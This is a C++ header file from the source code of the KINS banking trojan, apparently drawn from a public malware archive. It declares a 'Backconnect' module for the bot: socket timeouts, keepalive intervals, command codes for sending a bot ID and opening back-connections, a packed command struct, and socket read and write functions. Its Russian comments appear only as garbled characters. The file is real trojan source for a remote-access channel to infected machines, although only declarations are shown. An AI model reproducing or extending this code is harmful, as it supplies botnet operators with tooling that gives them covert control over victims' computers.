/*
  name      KINS
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ����������� ��� Backconnect.
*/
#pragma once

namespace Backconnect
{
  //�������� ���������.
  enum
  {
    SOCKET_TIMEOUT     = 30 * 1000,     //������� ��� �������.
    KEEPALIVE_DELAY    = 5 * 60 * 1000, //Keepalive.
    KEEPALIVE_INTERVAL = 5 * 1000       //�������� Keepalive � ������ ������.
  };
  
  //������� ��� BCCOMMAND.
  enum
  {
    COMMAND_UNKNOWN,    //������.
    COMMAND_BOTID,      //��������� �����. ����������, ����� ��������� ��������� ������ ��������
                        //wDataSize, ������� ID ����. ����� ��������, ��� ������ ���������� ��������
                        //�����������.
    COMMAND_CONNECT,    //���������� ��������. �������� ������ ���������� � bc ��������. ����� �
                        //���� DWORD ��� ���������� ID ��� ����������.
    COMMAND_IS_SERVICE, //��������� �����. �������� � ���, ��� ������ ���������� �������� ���������,
                        //����� � ���� DWORD ��������� �� COMMAND_CONNECT.
  };

  #pragma pack(push, 1)
  typedef struct
  {
    WORD structSize; //sizeof(COMMAND)
    WORD dataSize;   //������ ������ ������ ����� ���������.
    BYTE command;    //�������
  }COMMAND;
  #pragma pack(pop)
  
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������ ������� �� ������.

    IN s        - �����.
    OUT command - ��������� ��� ����������.
    OUT data    - ����� ��� ������, ��� NULL ���� ������ �� ���������. ����� ������ ���� ����������
                  ����� Mem.

    Return      - true  - � ������ ��������� ������ �������.
                  false - � ������ ������.
  */
  bool _readCommand(SOCKET s, COMMAND *command, LPBYTE *data);

  /*
    �������� ������� �� �����.

    IN s        - �����.
    IN command  - ������� BCC_*.
    IN data     - ������.
    IN dataSize - ������ ������.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool _writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize);
};
